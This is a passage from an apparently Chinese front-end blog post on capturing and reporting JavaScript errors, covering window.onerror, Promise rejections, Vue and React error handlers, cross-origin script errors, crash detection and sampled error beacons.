<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./jartto.png&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>我们发现，不论是静态资源异常，或者接口异常，错误都无法捕获到。</p></blockquote><p>补充一点：<code>window.onerror</code>  函数只有在返回  <code>true</code>  的时候，异常才不会向上抛出，否则即使是知道异常的发生控制台还是会显示  <code>Uncaught Error: xxxxx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Jartto</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>控制台就不会再有这样的错误了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">ReferenceError</span>: <span class="title class_">Jartto</span> is not defined</span><br><span class="line">    at <span class="built_in">setTimeout</span> ((index):<span class="number">36</span>)</span><br></pre></td></tr></table></figure><p>需要注意：<br /><code>onerror</code> 最好写在所有 <code>JS</code> 脚本的前面，否则有可能捕获不到错误；<br /><code>onerror</code> 无法捕获语法错误；<br />到这里基本就清晰了：在实际的使用过程中，<code>onerror</code> 主要是来捕获预料之外的错误，而 <code>try-catch</code> 则是用来在可预见情况下监控特定的错误，两者结合使用更加高效。</p><blockquote><p>问题又来了，捕获不到静态资源加载异常怎么办？</p></blockquote><p><a name="d6FmC"></a></p><h4 id="window-addEventListener"><a href="#window-addEventListener" class="headerlink" title="window.addEventListener"></a>window.addEventListener</h4><p>当一项资源（如图片或脚本）加载失败，加载资源的元素会触发一个 <code>Event</code> 接口的 <code>error</code> 事件，并执行该元素上的<code>onerror()</code> 处理函数。这些 <code>error</code> 事件不会向上冒泡到 <code>window</code> ，不过（至少在 <code>Firefox</code> 中）能被单一的<code>window.addEventListener</code> 捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;scritp&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;捕获到异常：&#x27;</span>, error);</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./jartto.png&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>控制台输出：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1593769169489-3ff60f7f-dfe6-4fee-872b-0605f51674ae.png#height=61&id=vvnzJ&originHeight=61&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13707&status=done&style=none&title=&width=830" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1593769169489-3ff60f7f-dfe6-4fee-872b-0605f51674ae.png#height=61&id=vvnzJ&originHeight=61&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13707&status=done&style=none&title=&width=830" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />由于网络请求异常不会事件冒泡，因此必须在捕获阶段将其捕捉到才行，但是这种方式虽然可以捕捉到网络请求的异常，但是无法判断 <code>HTTP</code> 的状态是 <code>404</code> 还是其他比如 <code>500</code> 等等，所以还需要配合服务端日志才进行排查分析才可以。<br />需要注意：</p><ul><li>不同浏览器下返回的 <code>error</code> 对象可能不同，需要注意兼容处理。</li><li>需要注意避免 <code>addEventListener</code> 重复监听。</li></ul><p><a name="E3DKU"></a></p><h4 id="Promise-Catch"><a href="#Promise-Catch" class="headerlink" title="Promise Catch"></a>Promise Catch</h4><blockquote><p>在 <code>promise</code> 中使用 <code>catch</code> 可以非常方便的捕获到异步 <code>error</code> ，这个很简单。</p></blockquote><p>没有写 <code>catch</code> 的 <code>Promise</code> 中抛出的错误无法被 <code>onerror</code> 或 <code>try-catch</code> 捕获到，所以我们务必要在 <code>Promise</code> 中不要忘记写 <code>catch</code> 处理抛出的异常。<br />解决方案： 为了防止有漏掉的 <code>Promise</code> 异常，建议在全局增加一个对 <code>unhandledrejection</code> 的监听，用来全局监听<code>Uncaught Promise Error</code>。使用方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们继续来尝试一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;promise error&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到如下输出：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1593769233296-009a130c-ab85-4015-8939-49a0bb66af62.png#height=472&id=BCxsN&originHeight=472&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81920&status=done&style=none&title=&width=871" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1593769233296-009a130c-ab85-4015-8939-49a0bb66af62.png#height=472&id=BCxsN&originHeight=472&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81920&status=done&style=none&title=&width=871" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />那如果对 <code>Promise</code> 不进行 <code>catch</code> 呢？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">reject</span>(<span class="string">&quot;jartto: promise error&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>嗯，事实证明，也是会被正常捕获到的。</p></blockquote><p>所以，正如我们上面所说，为了防止有漏掉的 <code>Promise</code> 异常，建议在全局增加一个对 <code>unhandledrejection</code> 的监听，用来全局监听 <code>Uncaught Promise Error</code>。<br />补充一点：如果去掉控制台的异常显示，需要加上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.<span class="title function_">preventDefault</span>();</span><br></pre></td></tr></table></figure><p><a name="ctAjd"></a></p><h4 id="VUE-errorHandler"><a href="#VUE-errorHandler" class="headerlink" title="VUE errorHandler"></a>VUE errorHandler</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">errorHandler</span> = <span class="function">(<span class="params">err, vm, info</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;通过vue errorHandler捕获的错误&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(vm);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(info);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="goIiu"></a></p><h4 id="React-异常捕获"><a href="#React-异常捕获" class="headerlink" title="React 异常捕获"></a>React 异常捕获</h4><p><code>React 16</code> 提供了一个内置函数 <code>componentDidCatch</code>，使用它可以非常简单的获取到 <code>react</code> 下的错误信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">componentDidCatch</span>(<span class="params">error, info</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error, info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外，我们可以了解一下：<code>[error boundary](https://blog.csdn.net/a986597353/article/details/78469979)</code><br /><code>UI</code> 的某部分引起的 <code>JS</code> 错误不应该破坏整个程序，为了帮 <code>React</code> 的使用者解决这个问题，<code>React 16</code> 介绍了一种关于错误边界（<code>error boundary</code>)的新观念。</p><blockquote><p>需要注意的是： error boundaries 并不会捕捉下面这些错误。</p></blockquote><p>1.事件处理器<br />2.异步代码<br />3.服务端的渲染代码<br />4.在 <code>error boundaries</code> 区域内的错误</p><p>我们来举一个小例子，在下面这个 <code>componentDIdCatch(error,info)</code> 里的类会变成一个 <code>error boundary</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorBoundary</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">hasError</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">componentDidCatch</span>(<span class="params">error, info</span>) &#123;</span><br><span class="line">    <span class="comment">// Display fallback UI</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">hasError</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    <span class="comment">// You can also log the error to an error reporting service</span></span><br><span class="line">    <span class="title function_">logErrorToMyService</span>(error, info);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">hasError</span>) &#123;</span><br><span class="line">      <span class="comment">// You can render any custom fallback UI</span></span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Something went wrong.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">children</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们像使用普通组件那样使用它：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ErrorBoundary</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">MyWidget</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">ErrorBoundary</span>&gt;</span><br></pre></td></tr></table></figure><p><code>componentDidCatch()</code> 方法像 <code>JS</code> 的 <code>catch&#123;&#125;</code> 模块一样工作，但是对于组件，只有 <code>class</code> 类型的组件(<code>class component</code> )可以成为一个 <code>error boundaries</code> 。<br />实际上，大多数情况下我们可以在整个程序中定义一个 <code>error boundary</code> 组件，之后就可以一直使用它了！</p><p><a name="sWUgU"></a></p><h4 id="iframe-异常"><a href="#iframe-异常" class="headerlink" title="iframe 异常"></a>iframe 异常</h4><p>对于 <code>iframe</code> 的异常捕获，我们还得借力 <code>window.onerror</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个简单的例子可能如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./iframe.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到 iframe 异常：&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      message,</span></span><br><span class="line"><span class="language-javascript">      source,</span></span><br><span class="line"><span class="language-javascript">      lineno,</span></span><br><span class="line"><span class="language-javascript">      colno,</span></span><br><span class="line"><span class="language-javascript">      error,</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="yQqqP"></a></p><h4 id="Script-error"><a href="#Script-error" class="headerlink" title="Script error"></a>Script error</h4><p>一般情况，如果出现 <code>Script error</code> 这样的错误，基本上可以确定是出现了跨域问题。这时候，是不会有其他太多辅助信息的，但是解决思路无非如下：</p><blockquote><p>跨源资源共享机制( <code>CORS</code> )：我们为 <code>script</code> 标签添加 <code>crossOrigin</code> 属性。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://jartto.wang/main.js&quot;</span> <span class="attr">crossorigin</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者动态去添加 <code>js</code> 脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.<span class="property">crossOrigin</span> = <span class="string">&quot;anonymous&quot;</span>;</span><br><span class="line">script.<span class="property">src</span> = url;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><blockquote><p>特别注意，服务器端需要设置：Access-Control-Allow-Origin</p></blockquote><p>此外，我们也可以试试这个-<a href="https://juejin.im/post/5c00a405f265da610e7fd024">解决 Script Error 的另类思路</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> originAddEventListener = <span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span>;</span><br><span class="line"><span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span> = <span class="keyword">function</span> (<span class="params">type, listener, options</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> wrappedListener = <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> listener.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> originAddEventListener.<span class="title function_">call</span>(<span class="variable language_">this</span>, type, wrappedListener, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>简单解释一下：</p><ul><li>改写了 <code>EventTarget</code> 的 <code>addEventListener</code> 方法；</li><li>对传入的 <code>listener</code> 进行包装，返回包装过的 <code>listener</code>，对其执行进行 <code>try-catch</code>；</li><li>浏览器不会对 <code>try-catch</code> 起来的异常进行跨域拦截，所以 <code>catch</code> 到的时候，是有堆栈信息的；</li><li>重新 <code>throw</code> 出来异常的时候，执行的是同域代码，所以 <code>window.onerror</code> 捕获的时候不会丢失堆栈信息；</li></ul><p>利用包装 <code>addEventListener</code>，我们还可以达到「扩展堆栈」的效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="keyword">const</span> originAddEventListener = <span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span>;</span><br><span class="line">   <span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span> = <span class="keyword">function</span> (<span class="params">type, listener, options</span>) &#123;</span><br><span class="line">+    <span class="comment">// 捕获添加事件时的堆栈</span></span><br><span class="line">+    <span class="keyword">const</span> addStack = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Event (<span class="subst">$&#123;type&#125;</span>)`</span>).<span class="property">stack</span>;</span><br><span class="line">     <span class="keyword">const</span> wrappedListener = <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> listener.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">+        <span class="comment">// 异常发生时，扩展堆栈</span></span><br><span class="line">+        err.<span class="property">stack</span> += <span class="string">&#x27;\n&#x27;</span> + addStack;</span><br><span class="line">         <span class="keyword">throw</span> err;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> originAddEventListener.<span class="title function_">call</span>(<span class="variable language_">this</span>, type, wrappedListener, options);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)();</span><br></pre></td></tr></table></figure><p><a name="vk1qk"></a></p><h4 id="崩溃和卡顿"><a href="#崩溃和卡顿" class="headerlink" title="崩溃和卡顿"></a>崩溃和卡顿</h4><p>卡顿也就是网页暂时响应比较慢， <code>JS</code> 可能无法及时执行。但崩溃就不一样了，网页都崩溃了，<code>JS</code> 都不运行了，还有什么办法可以监控网页的崩溃，并将网页崩溃上报呢？</p><blockquote><p>崩溃和卡顿也是不可忽视的，也许会导致你的用户流失。</p></blockquote><p>1.利用 <code>window</code> 对象的 <code>load</code> 和 <code>beforeunload</code> 事件实现了网页崩溃的监控。<br />不错的文章，推荐阅读：<a href="http://jasonjl.me/blog/2015/06/21/taking-action-on-browser-crashes/">Logging Information on Browser Crashes</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;good_exit&quot;</span>, <span class="string">&quot;pending&quot;</span>);</span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;time_before_crash&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toString</span>());</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;beforeunload&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;good_exit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;good_exit&quot;</span>) &amp;&amp;</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;good_exit&quot;</span>) !== <span class="string">&quot;true&quot;</span></span><br><span class="line">) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">        insert crash logging code here</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="title function_">alert</span>(</span><br><span class="line">    <span class="string">&quot;Hey, welcome back from your crash, looks like you crashed on: &quot;</span> +</span><br><span class="line">      <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;time_before_crash&quot;</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.基于以下原因，我们可以使用 <code>Service Worker</code> 来实现<a href="https://juejin.im/entry/5be158116fb9a049c6434f4a?utm_source=gold_browser_extension">网页崩溃的监控</a>：</p><ul><li><code>Service Worker</code> 有自己独立的工作线程，与网页区分开，网页崩溃了，<code>Service Worker</code> 一般情况下不会崩溃；</li><li><code>Service Worker</code> 生命周期一般要比网页还要长，可以用来监控网页的状态；</li><li>网页可以通过 <code>navigator.serviceWorker.controller.postMessage API</code> 向掌管自己的 <code>SW</code> 发送消息。</li><li><br /><a name="RJS5Y"></a></li></ul><h4 id="错误上报"><a href="#错误上报" class="headerlink" title="错误上报"></a>错误上报</h4><p>1.通过 <code>Ajax</code> 发送数据<br />因为 <code>Ajax</code> 请求本身也有可能会发生异常，而且有可能会引发跨域问题，一般情况下更推荐使用动态创建 <code>img</code> 标签的形式进行上报。<br />2.动态创建 <code>img</code> 标签的形式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">report</span>(<span class="params">error</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> reportUrl = <span class="string">&quot;http://jartto.wang/report&quot;</span>;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = <span class="string">`<span class="subst">$&#123;reportUrl&#125;</span>?logs=<span class="subst">$&#123;error&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收集异常信息量太多，怎么办？实际中，我们不得不考虑这样一种情况：如果你的网站访问量很大，那么一个必然的错误发送的信息就有很多条，这时候，我们需要设置采集率，从而<a href="https://github.com/happylindz/blog/issues/5">减缓服务器的压力</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reporter</span>.<span class="property">send</span> = <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="comment">// 只采集 30%</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.3</span>) &#123;</span><br><span class="line">    <span class="title function_">send</span>(data); <span class="comment">// 上报错误信息</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>采集率应该通过实际情况来设定，随机数，或者某些用户特征都是不错的选择。</p><p><a name="PnbNm"></a></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>回到我们开头提出的那个问题，如何优雅的处理异常呢？<br />1.可疑区域增加 <code>Try-Catch</code><br />2.全局监控 <code>JS</code> 异常 <code>window.onerror</code><br />3.全局监控静态资源异常 <code>window.addEventListener</code><br />4.捕获没有 <code>Catch</code> 的 <code>Promise</code> 异常：<code>unhandledrejection</code><br />5.<code>VUE errorHandler</code> 和 <code>React componentDidCatch</code><br />6.监控网页崩溃：<code>window</code> 对象的 <code>load</code> 和 <code>beforeunload</code><br />7.跨域 <code>crossOrigin</code> 解决<br />其实很简单，正如<a href="http://jartto.wang/2018/11/20/js-exception-handling/">上文</a>所说：采用组合方案，分类型的去捕获异常，这样基本 80%-90% 的问题都化于无形。</p><p><a name="nwDGU"></a></p><h2 id="SDK-埋点"><a href="#SDK-埋点" class="headerlink" title="SDK 埋点"></a>SDK 